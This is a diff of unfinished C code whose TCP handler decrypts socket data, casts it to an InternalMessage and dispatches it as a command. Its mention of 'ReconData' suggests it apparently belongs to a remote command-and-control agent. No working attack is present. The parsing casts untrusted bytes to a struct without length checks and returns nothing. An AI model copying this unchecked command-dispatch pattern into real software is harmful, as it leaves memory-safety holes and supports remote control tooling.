@@ -33,9 +33,12 @@
  * */
 
 
+
+// TODO: add custom enum error codes, to use as return values for this function... so i can see what/where the error came from
 // NOTE: rawData (comes from recv function) -> decrypt -> decompress (if needed) -> decode (if needed) -> deserialize/parse -> handle command
 // TODO: rawData should be const?
-int handleTCP(uint8_t* rawData, size_t rawDataLength, Config* config)  // TODO: add InternalMessage var to store result?
+//int handleTCP(uint8_t* rawData, size_t rawDataLength, Config* config)  // TODO: add InternalMessage var to store result?
+int handleTCP(uint8_t* rawData, size_t rawDataLength, InternalMessage* resultMsg, Config* config)
 {
 	// Raw Bytes from Socket
 	uint8_t buf[4096]; // TODO: rename to plaintext?
@@ -59,10 +62,17 @@ int handleTCP(uint8_t* rawData, size_t rawDataLength, Config* config)  // TODO: 
     // size_t expected_size = offsetof(InternalMessage, data) + msg->data_len;
     // check length(plaintext) == expected_size
 
+	InternalMessage* msg = (InternalMessage*)buf;
 
 	// EXECUTE (InternalMessage)
 	// call function based on InternalMessage
-	processMessage(payload, header); // TODO: check return type for errors?
+	//processMessage(msg->payload, msg->header); // TODO: check return type for errors?
+	processMessage(msg, config);
+
+	// TODO: convert InternalMessage from processMessage into an InternalMessage.payload
+	//InternalMessage* response = malloc(sizeof(InternalMessage));
+	//memcpy(response->payload, &recon, sizeof(ReconData));
+	//response->header.payload_size = sizeof(ReconData);
 
 	// TODO: cleanup/free buf
 }
@@ -88,13 +98,5 @@ int handleHTTPS(uint8_t* data)
 
 	// EXECUTE (InternalMessage)
 
-
-}
-
-// this function processes the header of the message
-// to determine how to interpet the contents/data of 
-// the message. 
-int processMessage()
-{
 
 }
